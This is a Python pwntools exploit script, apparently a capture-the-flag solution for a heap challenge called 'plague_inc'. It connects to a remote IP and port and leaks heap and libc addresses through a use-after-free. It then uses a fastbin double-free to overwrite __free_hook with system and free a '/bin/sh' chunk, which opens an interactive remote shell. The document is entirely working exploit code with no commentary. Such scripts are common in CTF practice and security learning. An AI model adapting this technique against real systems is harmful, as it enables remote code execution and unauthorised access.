from pwn import *
import sys

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./plague_inc")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
else:
	p = remote("101.200.161.151","15201")
	libc = ELF("./libc.so.6")

def menu(choice):
	p.sendlineafter("Your choice:\n",str(choice))

def add(type_,content):
	menu(1)
	menu(type_)
	p.sendafter("The 'Patient Zero' lives in:\n",content)

def free(index):
	menu(2)
	p.sendlineafter("Index of country:\n",str(index))

def edit(index,content):
	menu(3)
	p.sendlineafter("Index of country:\n",str(index))
	p.sendafter("Which cities to break out in?\n",content)

def show(index):
	menu(4)
	p.sendlineafter("Index of country:\n",str(index))

code_base = 0x555555554000
def debugf():
	if debug:
		gdb.attach(p,"b *{b}".format(b = hex(code_base + 0x0000000000001860)))

context.log_level = "debug"
context.terminal = ["tmux","splitw","-h"]
#debugf()
add(1,"0")
add(0,"1")
add(1,"2")
add(0,"3")
free(0)
free(2)
add(1,"4")
free(0)
show(4)
p.recvuntil("Current status:\n")
leak_addr = u64(p.recv(8).ljust(8,"\x00"))
heap_base = leak_addr - 0x12a0
log.success("heap_base:" + hex(heap_base))
leak_addr = u64(p.recv(6).ljust(8,"\x00"))
libc.address = leak_addr - 88 - 0x10 - libc.symbols["__malloc_hook"]
log.success("libc_base:" + hex(libc.address))
#debugf()
free(1)
free(3)
free(1)
target = heap_base + 0x20 * 5
add(0,p64(target)) #5
add(0,"6")
add(0,"7")
add(0,"\x21") #8
free(6)
free(7)
free(6)
target = heap_base + 0x20 * 5 + 8
debugf()
add(0,p64(target)) #9
add(0,"6") #10
add(0,"/bin/sh\x00") #11
target = libc.symbols["__free_hook"]
add(0,p64(target)) #12
target = libc.symbols["system"]
edit(5,p64(target))
free(11)
p.interactive()
